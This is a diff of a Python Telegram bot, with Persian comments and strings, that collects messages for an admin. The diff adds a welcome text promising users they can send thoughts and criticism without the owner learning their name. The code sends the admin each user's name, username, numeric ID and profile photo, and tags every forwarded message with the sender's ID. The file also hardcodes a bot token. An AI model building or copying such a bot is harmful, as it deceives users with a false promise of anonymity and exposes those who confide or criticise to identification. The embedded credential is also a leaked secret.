@@ -8,7 +8,8 @@ TOKEN = os.getenv("BOT_TOKEN")
 if not TOKEN:
     TOKEN = "8775388406:AAGe5pikRxUf6Tpy1INzl5Mx7Z5Jyua9LAc"
 
-ADMIN_ID = 8117214960
+# ⚠️ اینجا آیدی عددی خودت رو بذار (از @userinfobot بگیر)
+ADMIN_ID = 123456789  # ← این رو عوض کن
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask('')
@@ -32,25 +33,31 @@ def start(message):
     first_name = user.first_name or "ندارد"
     last_name = user.last_name or "ندارد"
 
-    bot.send_message(
-        ADMIN_ID,
-        f"👤 کاربر جدید:\n"
-        f"نام: {first_name} {last_name}\n"
-        f"آیدی: {user_id}\n"
-        f"یوزرنیم: {username}"
-    )
-
+    # ارسال اطلاعات به ادمین
     try:
-        photos = bot.get_user_profile_photos(user_id)
-        if photos.total_count > 0:
-            file_id = photos.photos[0][-1].file_id
-            bot.send_photo(ADMIN_ID, file_id, caption="🖼 عکس پروفایل")
-    except:
-        pass
+        bot.send_message(
+            ADMIN_ID,
+            f"👤 کاربر جدید:\n"
+            f"نام: {first_name} {last_name}\n"
+            f"آیدی: {user_id}\n"
+            f"یوزرنیم: {username}"
+        )
+    except Exception as e:
+        print(f"⚠️ خطا در ارسال به ادمین: {e}")
 
-    bot.send_message(
-        message.chat.id,
-        "سلام Ryan هستم! 🌹\n\nهر حرفی داری بفرست."
+    # دریافت عکس پروفایل
+    try:
+        photos = bot.get_user_profile_photos(user_id, limit=1)
+        if photos and photos.total_count > 0:
+            file_id = photos.photos[0][0].file_id
+            bot.send_photo(ADMIN_ID, file_id, caption="🖼 عکس پروفایل کاربر")
+    except Exception as e:
+        print(f"⚠️ خطا در دریافت عکس: {e}")
+
+    # پیام خوش‌آمد به کاربر
+    bot.reply_to(
+        message,
+        "سلام Ryan هستم! 🌹\n\nهر حرفی که تو دلت هست یا هر انتقادی که نسبت به من داری رو با خیال راحت بنویس و بفرست. بدون اینکه از اسمت باخبر بشم پیامت به من می‌رسه."
     )
 
 @bot.message_handler(func=lambda message: True)
@@ -58,20 +65,24 @@ def forward_all_messages(message):
     user = message.from_user
     text = message.text or "پیام غیرمتنی"
 
-    bot.send_message(
-        ADMIN_ID,
-        f"📩 پیام جدید:\n"
-        f"آیدی: {user.id}\n"
-        f"متن: {text}"
-    )
+    try:
+        bot.send_message(
+            ADMIN_ID,
+            f"📩 پیام جدید:\n"
+            f"آیدی: {user.id}\n"
+            f"متن: {text}"
+        )
+    except Exception as e:
+        print(f"⚠️ خطا در ارسال پیام به ادمین: {e}")
 
-    bot.reply_to(message, "✅ پیامت ارسال شد! 🙏")
+    bot.reply_to(message, "✅ پیامت با موفقیت ارسال شد! 🙏")
 
 keep_alive()
-print("🤖 ربات روشن شد...")
+print("🤖 ربات Ryan روشن شد...")
 
 while True:
     try:
         bot.infinity_polling(skip_pending=True)
-    except:
+    except Exception as e:
+        print(f"⚠️ خطا: {e}")
         time.sleep(5)
